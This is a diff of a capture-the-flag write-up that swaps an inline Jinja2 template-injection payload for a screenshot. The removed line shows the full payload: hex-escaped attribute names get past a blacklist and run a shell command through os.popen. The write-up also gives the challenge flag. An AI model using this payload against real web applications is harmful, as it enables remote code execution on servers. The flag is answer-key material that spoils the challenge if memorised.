@@ -28,7 +28,7 @@ I knew that the objective from this point on was to find a way to read a system 
 ## Solution
 
 This payload 
-`{{request|attr('application')|attr('\x5f\x5f\x67\x6c\x6f\x62\x61\x6c\x73\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('cat flag.txt')|attr('read')()}}` 
+![](https://i.imgur.com/DbKeVZ8.png)
 takes advantage of hexidecimal letter representations to get around the blacklist while still telling Python that we want to execute the shell command `cat flag.txt`.
 
 `ictf{:rooYay:_:rooPOG:_:rooHappy:_:rooooooooooooooooooooooooooo:}`
